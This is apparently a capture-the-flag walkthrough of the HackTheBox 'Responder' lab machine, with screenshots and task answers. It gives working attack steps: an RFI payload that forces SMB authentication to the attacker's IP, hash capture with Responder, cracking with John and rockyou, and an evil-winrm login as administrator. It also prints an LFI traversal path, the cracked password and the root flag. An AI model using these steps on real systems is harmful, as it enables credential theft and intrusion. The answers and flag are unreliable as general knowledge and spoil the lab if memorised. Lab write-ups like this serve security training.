Starting Point - Tier 1

-Machine Name: Responder

-Difficulty: Very Easy

-IP address: 10.129.248.155


##  Steps:
- to acesss the website, add the ip adress to the /etc/hosts file

      nano /etc/hosts
  <img width="527" height="259" alt="Screenshot 2025-08-30 125125" src="https://github.com/user-attachments/assets/02c00048-1647-4f5e-b3e4-ce9380278940" />


- show HackTheBox VPN IP address, by filtering only the tun0 interface

      ip a | grep tun0
  <img width="979" height="94" alt="Screenshot 2025-08-30 125314" src="https://github.com/user-attachments/assets/4c86166b-2684-43af-b893-cb58ba0d54c4" />

- to capture authentication attempts and steal hashes from machines on the network

        sudo responder -I tun0

  <img width="554" height="566" alt="Screenshot 2025-08-30 125347" src="https://github.com/user-attachments/assets/c0071814-dd42-4d79-92c3-8f4c2f4c9143" />

- attempt to open a shared file using the IP and a shared folder/file on your browser

        unika.htb/index.php?page=//<ip add of HTB VPN>/ShareFileHTB

- wait for the responder to listen and give the results

  <img width="1264" height="521" alt="Screenshot 2025-08-30 125411" src="https://github.com/user-attachments/assets/1d41ceff-d48d-4915-b3d0-46cd45ce586f" />

- copy the hash then save as hash
  <img width="1265" height="144" alt="Screenshot 2025-08-30 125446" src="https://github.com/user-attachments/assets/72c4959e-bdcf-4729-a51e-8c6dfe163e07" />

- decompresses the rockyou.txt.gz wordlist so you can use it in brute-force or password-cracking attacks

      sudo gunzip /usr/share/wordlists/rockyou.txt.gz
- crack a given hash using the RockYou wordlist

      john -w=/usr/share/wordlists/rockyou.txt hash
  <img width="950" height="244" alt="Screenshot 2025-08-30 125542" src="https://github.com/user-attachments/assets/507f0336-e2b6-42a8-bf12-5565251aeedf" />

- use Evil-WinRM to open a remote PowerShell session on the target Windows host as the Administrator, authenticating with the password badminton

      evil-winrm -i <ip add> -u administrator -p badminton

  <img width="1354" height="519" alt="Screenshot 2025-08-30 125625" src="https://github.com/user-attachments/assets/b807e297-2378-4801-8f72-f6a2201f36c0" />

- explore users and their contents
  <img width="609" height="586" alt="Screenshot 2025-08-30 125659" src="https://github.com/user-attachments/assets/f44ff028-acaa-4040-9b59-ab042e3b5846" />

- use tht type to open the content of the .txt file
  <img width="532" height="47" alt="Screenshot 2025-08-30 125709" src="https://github.com/user-attachments/assets/2583f78c-906a-4d3e-b488-e877b47a223e" />



##    Tasks:
Task 1

-When visiting the web service using the IP address, what is the domain that we are being redirected to?


    unika.htb


Task 2

-Which scripting language is being used on the server to generate webpages?


    php


Task 3

-What is the name of the URL parameter which is used to load different language versions of the webpage?


    page


Task 4

-Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"


    ../../../../../../../../windows/system32/drivers/etc/hosts


Task 5

-Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"


    //10.10.14.6/somefile


Task 6

-What does NTLM stand for?


    New Technology Lan Manager


Task 7

-Which flag do we use in the Responder utility to specify the network interface?


    -I


Task 8

-There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?.


    John The Ripper


Task 9

-What is the password for the administrator user?


    badminton


Task 10

-We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?


    5985


Submit Flag

-Submit root flag


    ea81b7afddd03efaa0945333ed147fac
